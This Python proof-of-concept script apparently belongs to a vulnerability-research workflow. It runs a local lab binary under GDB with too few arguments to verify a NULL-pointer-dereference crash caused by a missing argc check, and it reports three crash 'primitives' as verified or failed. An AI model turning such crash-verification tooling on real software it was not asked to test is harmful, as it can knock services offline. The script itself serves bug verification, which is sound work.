#!/usr/bin/env python3
"""
PoC for BUG-001: NULL_POINTER_DEREF_MISSING_ARGC_CHECK

Primitive: NULL_POINTER_DEREF / CRASH / DOS

Chain:
  BUG-001 (missing argc check)
    -> Root Cause: main() dereferences argv[1]/argv[2] via double indirection
       (mov rax,[argv+off]; mov rax,[rax]) without checking argc >= 3
    -> Memory Primitive: NULL pointer dereference (read 8 bytes from address 0x0)
    -> Controlled Operation: attacker controls invocation (number of args)
    -> Primitive: NULL_POINTER_DEREF -> CRASH -> DOS

This PoC verifies:
  PRIM-001: NULL_POINTER_DEREF — running with 0 args crashes at 0x1193 (argv[1] deref), rax=0
  PRIM-002: NULL_POINTER_DEREF — running with 1 arg crashes at 0x117b (argv[2] deref), rax=0
  PRIM-003: CRASH/DOS — process terminates with SIGSEGV (rc=-11), no output produced

All three are direct primitives (no intermediate object reuse).
They share the same root cause and preconditions.
"""

import subprocess
import os

BINARY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "target")

def run_gdb(args, gdb_commands):
    """Run binary under GDB with given args and commands, return output.

    GDB batch mode: file/args set up, run (crashes at SIGSEGV), then
    post-crash commands (info registers, bt) execute at the fault point.
    """
    cmd = [
        "gdb", "-batch", "-nx",
        "-ex", "set pagination off",
        "-ex", "set confirm off",
        "-ex", f"file {BINARY}",
        "-ex", f"set args {' '.join(args)}",
        "-ex", "run",
    ] + [item for c in gdb_commands for item in ("-ex", c)] + \
        ["-ex", "quit"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    return result.stdout + result.stderr

def run_plain(args):
    """Run binary directly, return (rc, stdout_bytes)."""
    result = subprocess.run([BINARY] + args, capture_output=True, timeout=10)
    return result.returncode, result.stdout

print("=" * 60)
print("BUG-001: NULL_POINTER_DEREF_MISSING_ARGC_CHECK")
print("Primitive Verification PoC")
print("=" * 60)

# ============================================================
# PRIM-001: NULL_POINTER_DEREF (0 args -> argv[1] is NULL)
# ============================================================
print("\n--- PRIM-001: NULL_POINTER_DEREF (0 args, argv[1] deref) ---")
out1 = run_gdb([], [
    "info registers rax rip",
    "bt",
])
print(out1)

segfault_1193 = "SIGSEGV" in out1 and "5193" in out1
rax_zero_1 = "rax" in out1 and "0x0" in out1
print(f"  SIGSEGV at 0x1193 (argv[1] deref): {segfault_1193}")
print(f"  rax = 0x0 (NULL): {rax_zero_1}")
if segfault_1193 and rax_zero_1:
    print("=== PRIM-001: VERIFIED (NULL_POINTER_DEREF at 0x1193, rax=0) ===")
else:
    print("=== PRIM-001: FAILED ===")

# ============================================================
# PRIM-002: NULL_POINTER_DEREF (1 arg -> argv[2] is NULL)
# ============================================================
print("\n--- PRIM-002: NULL_POINTER_DEREF (1 arg, argv[2] deref) ---")
out2 = run_gdb(["AAAA"], [
    "info registers rax rip",
    "bt",
])
print(out2)

segfault_117b = "SIGSEGV" in out2 and "517b" in out2
rax_zero_2 = "rax" in out2 and "0x0" in out2
print(f"  SIGSEGV at 0x117b (argv[2] deref): {segfault_117b}")
print(f"  rax = 0x0 (NULL): {rax_zero_2}")
if segfault_117b and rax_zero_2:
    print("=== PRIM-002: VERIFIED (NULL_POINTER_DEREF at 0x117b, rax=0) ===")
else:
    print("=== PRIM-002: FAILED ===")

# ============================================================
# PRIM-003: CRASH / DOS (process termination, no output)
# ============================================================
print("\n--- PRIM-003: CRASH/DOS (rc=-11 SIGSEGV, no stdout) ---")
rc0, out0 = run_plain([])
rc1, out1b = run_plain(["AAAA"])
print(f"  0 args: rc={rc0}, stdout_len={len(out0)}")
print(f"  1 arg:  rc={rc1}, stdout_len={len(out1b)}")
if rc0 == -11 and rc1 == -11 and len(out0) == 0 and len(out1b) == 0:
    print("=== PRIM-003: VERIFIED (CRASH/DOS: rc=-11 SIGSEGV, no output) ===")
else:
    print("=== PRIM-003: FAILED ===")

# ============================================================
# Summary
# ============================================================
print("\n" + "=" * 60)
print("SUMMARY:")
p1 = segfault_1193 and rax_zero_1
p2 = segfault_117b and rax_zero_2
p3 = rc0 == -11 and rc1 == -11 and len(out0) == 0 and len(out1b) == 0
print(f"  PRIM-001 (NULL_POINTER_DEREF @0x1193): {'VERIFIED' if p1 else 'FAILED'}")
print(f"  PRIM-002 (NULL_POINTER_DEREF @0x117b): {'VERIFIED' if p2 else 'FAILED'}")
print(f"  PRIM-003 (CRASH/DOS rc=-11):           {'VERIFIED' if p3 else 'FAILED'}")
print("=" * 60)
